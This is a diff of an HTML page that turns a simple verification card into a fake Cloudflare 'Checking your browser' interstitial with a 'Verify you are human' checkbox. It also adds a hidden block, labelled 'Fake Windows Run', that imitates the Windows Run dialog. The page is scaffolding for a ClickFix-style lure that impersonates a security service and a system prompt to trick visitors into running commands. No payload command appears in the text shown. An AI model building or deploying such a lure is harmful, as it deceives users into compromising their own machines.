@@ -1,24 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Security Verification</title>
+<meta charset="UTF-8">
+<title>Checking your browser</title>
 <link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="run-popup.css">
 </head>
 
 <body>
 
-<div class="card">
+<div class="browser">
 
-<h2>Checking your browser</h2>
+<div class="cf-box">
 
-<p>github.io needs to review the security of your connection before proceeding.</p>
+<h2>Checking your browser before accessing example.com</h2>
 
-<label class="checkbox">
+<p>This process is automatic. Your browser will redirect shortly.</p>
+
+<label class="captcha">
 <input type="checkbox" id="verify">
-Verify you are human
+<span>Verify you are human</span>
 </label>
 
 <div id="status"></div>
+
+<p class="footer">Performance & security by Cloudflare</p>
+
+</div>
+
+</div>
+
+<!-- Fake Windows Run -->
+
+<div id="runBox" class="runBox hidden">
+
+<div class="runHeader">Run</div>
+
+<div class="runContent">
+
+<p>Type the name of a program, folder, document, or Internet resource.</p>
+
+<input id="runInput">
+
+<div class="buttons">
+
+<button onclick="closeRun()">Cancel</button>
+<button>OK</button>
+
+</div>
+
+</div>
 
 </div>
 
